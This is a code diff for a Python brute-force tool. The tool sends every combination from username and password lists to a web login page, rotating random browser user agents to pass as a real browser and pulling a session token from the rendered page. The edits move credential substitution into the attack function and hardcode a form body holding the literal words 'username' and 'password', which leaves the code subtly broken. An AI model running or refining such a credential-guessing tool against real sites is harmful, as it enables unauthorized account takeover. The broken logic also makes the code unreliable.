@@ -4,18 +4,16 @@ import time
 import requests
 from lxml import html
 from scipy import rand
-import mechanize
 import ssl
 success = False
-
 def brute(parameters, passwords):
     '''
     sends all combinations for usernames and passwords to the attack function on the login page
     '''
     # return
-    req_body_type, parameters['req_body'] = get_req_type(parameters['headers'], parameters['req_body'])
+    parameters['req_body_type'], parameters['req_body'] = get_req_type(parameters['headers'], parameters['req_body'])
     print("up: " + str(parameters['req_body']))
-    
+
     for user in parameters['user_list']:
         user = user.strip()
         user = user.split('\t')
@@ -24,7 +22,6 @@ def brute(parameters, passwords):
             password = password.strip()
             password = password.split('\t')
             parameters['password'] = password[0]
-            parameters['req_body'] = change_cred(parameters['req_body'], parameters['user_param'], parameters['password_param'], parameters['username'], parameters['password'], req_body_type)
             attack(parameters)
 
 
@@ -37,13 +34,15 @@ def attack(content):
     # build packet headers in order to disguise as a browser
     headers = content['headers']
     headers['User-Agent'] = get_random_user_agent()
-    payload = content['req_body']
-    
-    print("[+ payload]: " + str(payload))
-    
     session = HTMLSession()
     res = session.get(content['host'])
     res.html.render(sleep=1, keep_page=True)
+
+    content['req_body'] = change_cred(content['req_body'], content['user_param'], content['password_param'], content['username'], content['password'], content['req_body_type'])
+
+    payload = content['req_body']
+    
+    print("[+ payload]: " + str(payload))
     
     if content['method'] == 'post':
         resp = session.post(content['host'], data=payload)
@@ -114,8 +113,8 @@ def get_random_user_agent():
 
 
 def get_req_type(header, req_body):
-    type = 'json' # header['Content-Type']
-    print("header: " + str(type))
+    type = header['Content-Type']
+    
     if 'json' in type:
         return 'JSON', req_body
 
@@ -133,7 +132,9 @@ def change_cred(req_body, user_param, pass_param, username, password, req_body_t
     print('[+]type: ' + str(type(req_body)) + "real type: " + str(req_body_type))
     req_body[user_param] = username
     req_body[pass_param] = password
-    
+    req_body_type = 'URL_ENCODED'
+
+    print( '\n\n\n\n\n' + str(req_body) + '\n\n\n\n\n')
     if req_body_type == 'JSON':
         return req_body
     
@@ -142,5 +143,5 @@ def change_cred(req_body, user_param, pass_param, username, password, req_body_t
         
     elif req_body_type == 'URL_ENCODED':
         import urllib
-        return urllib.parse.urlencode(req_body)  # convert from json to encoded
+        return 'user_login=username&user_password=password&submit=Sign+in&user_token='+ req_body['user_token'] # convert from json to encoded
 
